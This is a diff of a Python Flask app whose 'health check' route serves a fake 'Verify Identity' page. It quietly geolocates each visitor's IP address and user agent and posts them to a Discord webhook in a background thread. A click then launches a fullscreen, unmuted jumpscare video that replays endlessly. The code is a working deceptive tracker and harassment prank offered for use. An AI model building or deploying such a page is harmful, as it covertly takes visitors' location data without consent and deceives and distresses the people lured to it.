@@ -1,5 +1,5 @@
 # api/index.py
-# FINAL VERSION - Fixed server error and redesigned Discord log embed.
+# FINAL VERSION - Fixed server error and updated jumpscare video.
 
 import os
 import re
@@ -9,6 +9,7 @@ import httpx
 import asyncio
 import traceback
 import time
+import threading # <--- THIS LINE WAS MISSING AND CAUSED THE CRASH
 from flask import Flask, request
 
 from telegram import Update
@@ -200,7 +201,6 @@ def log_to_discord(ip, user_agent):
     """Fetches geolocation data and sends a detailed log to Discord."""
     if not DISCORD_WEBHOOK_URL:
         return
-    
     geo_info = {}
     try:
         import requests
@@ -226,7 +226,6 @@ def log_to_discord(ip, user_agent):
         ],
         "footer": {"text": f"Timestamp: {time.ctime()}"}
     }
-
     data = {"embeds": [embed]}
     try:
         requests.post(DISCORD_WEBHOOK_URL, json=data, timeout=5)
@@ -239,6 +238,7 @@ def health_check_and_scare():
     user_agent = request.headers.get('User-Agent', 'Unknown')
     threading.Thread(target=log_to_discord, args=(ip_address, user_agent)).start()
 
+    # --- Jumpscare HTML with Video ---
     html_content = """
     <!DOCTYPE html>
     <html lang="en">
@@ -261,21 +261,30 @@ def health_check_and_scare():
             <button id="enter-btn">Verify Identity</button>
         </div>
         <div id="scare">
-            <video id="scare-video" src="https://v.vlipsy.com/v/3hEsFXt9.mp4" playsinline loop></video>
+            <video id="scare-video" src="https://v.vlipsy.com/v/3hEsFXt9.mp4" playsinline></video>
         </div>
         <script>
             const enterButton = document.getElementById('enter-btn');
             const scareContainer = document.getElementById('scare');
             const scareVideo = document.getElementById('scare-video');
+            
             enterButton.addEventListener('click', () => {
                 document.getElementById('container').style.display = 'none';
                 scareContainer.style.display = 'block';
-                scareVideo.muted = false;
+                
+                scareVideo.muted = false; // The video has its own sound
                 scareVideo.play().catch(e => console.error("Autoplay failed:", e));
+                
+                // When the video ends, loop it by resetting and playing again
+                scareVideo.onended = function() {
+                    this.currentTime = 0;
+                    this.play();
+                };
+
                 try {
                     if (scareContainer.requestFullscreen) {
                         scareContainer.requestFullscreen();
-                    } else if (scareContainer.webkitRequestFullscreen) {
+                    } else if (scareContainer.webkitRequestFullscreen) { /* Safari */
                         scareContainer.webkitRequestFullscreen();
                     }
                 } catch (e) {
